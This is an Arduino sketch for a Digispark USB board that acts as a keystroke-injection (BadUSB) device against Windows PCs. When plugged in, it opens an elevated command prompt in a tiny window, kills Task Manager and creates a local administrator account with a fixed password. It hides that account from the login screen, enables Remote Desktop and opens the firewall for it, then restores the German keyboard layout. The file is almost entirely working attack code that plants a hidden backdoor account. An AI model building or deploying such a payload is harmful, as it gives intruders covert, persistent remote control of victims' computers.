#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
  
  // Open PowerShell
   
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Set Layout to US
  
  DigiKeyboard.print("Set");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("WinUserLanguageList ");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("Force en");
  DigiKeyboard.sendKeyStroke(56);
  DigiKeyboard.print("US");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  // Exploit (Add your code here)
  
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
 
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskmgr"); //starting taskmgr
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_F, MOD_ALT_LEFT); 
  DigiKeyboard.sendKeyStroke(KEY_N);//run
  DigiKeyboard.delay(500);
  DigiKeyboard.print("cmd /k mode con: cols=15 lines=1");//start cmd
  DigiKeyboard.sendKeyStroke(KEY_TAB); 
  DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn on admin privileges
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //run
  DigiKeyboard.delay(200);
  DigiKeyboard.println("taskkill /IM \"taskmgr.exe\" /F ");//killing taskmanager
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("net user blanka Ping@123 /ADD");//adding user
  DigiKeyboard.delay(500);
  DigiKeyboard.println("net localgroup Administrators blanka /ADD");//adding user to admin group
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\" /v blanka /t REG_DWORD /d 0 /f"));//Hiding user from login screen
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f"));//Turning Remote desktop
  DigiKeyboard.delay(500);
  DigiKeyboard.println(F("netsh advfirewall firewall set rule group=\"remote desktop\" new enable=yes"));//Allowing remote desktop through firewall
  DigiKeyboard.delay(500);
  DigiKeyboard.println("net localgroup \"Remote Desktop Users\" blanka /add");//adding created user to remote desktop group
  DigiKeyboard.delay(500);  
  DigiKeyboard.println("exit");//adding created user to remote desktop group
  
  //turn on led when program finishes

  DigiKeyboard.delay(200);  
  digitalWrite(1, HIGH); 

  // Set Layout to DE

  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_D, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell -noexit -command \"mode con cols=18 lines=1\""); //smallest window possible
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Set-WinUserLanguageList -Force de-DE");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  for(;;){ /*empty*/ }
}
